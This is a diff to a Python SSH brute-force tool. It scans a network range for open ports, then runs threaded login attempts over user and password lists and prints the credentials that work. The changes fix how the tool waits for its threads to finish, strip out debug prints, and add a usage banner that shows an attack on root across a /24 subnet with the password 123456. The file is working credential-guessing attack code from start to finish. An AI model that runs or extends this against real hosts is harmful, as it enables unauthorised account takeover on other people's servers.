@@ -24,9 +24,11 @@ class brute():
 			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
 			ssh_client.connect(hostname=str(host),port=self.port,username=user,password=passwd)
 			print("check sessus:%s %s %s" % (host,user,passwd))
-		except Exception as e:
+		except:
 			pass
-			#print(e)
+		self.lock.acquire()
+		self.wait_thread = self.wait_thread - 1	
+		self.lock.release()
 
 	def __check_file(self,filename):
 		return os.path.isfile(filename)
@@ -77,22 +79,36 @@ class brute():
 				sleep(0.1)
 			threading.Thread(target=self.__check_port,args=(str(host),self.port)).start()
 		while self.wait_thread != 0:
-			sleep(0.1) 
+			sleep(0.1)
 		print("port scan done")
 
 	def ssh_check(self):
 		self.__host_port_access()
+		self.wait_thread=len(self.hosts)*len(self.users)*len(self.passwd)
 		for host in self.hosts:
-			if 1==1:
-				for user in self.users:
-					for p in self.passwd:
-						while threading.activeCount() > self.thread:
-							sleep(0.1)
-						threading.Thread(target=self.__ssh_login,args=(host,user.strip(),p.strip())).start()
+			for user in self.users:
+				for p in self.passwd:
+					while threading.activeCount() > self.thread:
+						sleep(0.1)
+					threading.Thread(target=self.__ssh_login,args=(host,user.strip(),p.strip())).start()
+		while self.wait_thread != 0:
+			sleep(0.1)
 if __name__ == '__main__':
 	method=""
 	brute = brute()
 	args=sys.argv
+	if len(args) != 9:
+		help="""
+help:
+	-m set brute method eg:ssh
+	-h set host eg:127.0.0.1/24
+	-u set one user
+	-U set user file
+	-p set one pass
+	-P set pass file
+%s -m ssh -h 10.10.1.0/24 -u root -p 123456
+			""" % (args[0])
+		exit(help)
 	brute.set_hosts(args[args.index('-h')+1])
 	if '-u' in args:
 		brute.set_user(args[args.index('-u')+1])
@@ -104,5 +120,4 @@ if __name__ == '__main__':
 		brute.set_passwd_from_file(args[args.index('-P')+1])
 	method = args[args.index('-m')+1]
 	if method=='ssh':
-		print(method)
 		brute.ssh_check()
